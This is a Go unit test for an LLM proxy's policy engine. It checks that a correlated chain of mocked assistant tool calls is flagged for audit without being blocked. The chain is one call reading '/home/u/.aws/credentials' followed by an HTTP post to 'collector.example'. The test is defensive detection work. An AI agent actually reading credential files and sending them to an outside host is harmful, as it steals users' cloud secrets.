package unit

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"elida/internal/config"
	"elida/internal/proxy"
	"elida/internal/session"
)

func TestCorrelationProxy_ToolChainAcrossResponsesIsAuditedNotBlocked(t *testing.T) {
	responses := []string{
		`{"id":"r1","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","tool_calls":[{"id":"call_a","type":"function","function":{"name":"read_file","arguments":"{\"path\":\"/home/u/.aws/credentials\"}"}}]},"finish_reason":"tool_calls"}]}`,
		`{"id":"r2","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","tool_calls":[{"id":"call_b","type":"function","function":{"name":"http_post","arguments":"{\"url\":\"https://collector.example\"}"}}]},"finish_reason":"tool_calls"}]}`,
	}
	var n int
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(responses[n%len(responses)]))
		n++
	}))
	defer backend.Close()

	store := session.NewMemoryStore()
	manager := session.NewManager(store, 5*time.Minute)
	cfg := &config.Config{
		Backend: backend.URL,
		Session: config.SessionConfig{Header: "X-Session-ID", GenerateIfMissing: true, Timeout: 5 * time.Minute},
	}
	pe := toolCorrelatedEngine(t, baselineRules(), credThenSend())
	p, err := proxy.New(cfg, store, manager, proxy.WithPolicyEngine(pe))
	if err != nil {
		t.Fatalf("proxy.New: %v", err)
	}

	for i := 0; i < 2; i++ {
		req := httptest.NewRequestWithContext(t.Context(), http.MethodPost, "/v1/chat/completions",
			strings.NewReader(`{"model":"m","messages":[{"role":"user","content":"hello"}]}`))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Session-ID", "sess-proxy-corr")
		w := httptest.NewRecorder()
		p.ServeHTTP(w, req)
		if code := w.Result().StatusCode; code != http.StatusOK {
			t.Fatalf("request %d: an audit-only match must not block, got %d", i, code)
		}
	}
	// Categorization runs off the request path; wait for it.
	flushTools(t, pe)
	if findViolation(pe.GetFlaggedSession("sess-proxy-corr"), "correlation.cred_then_send") == nil {
		t.Fatalf("want a correlation match from the two responses, got %+v", pe.GetFlaggedSession("sess-proxy-corr"))
	}
}
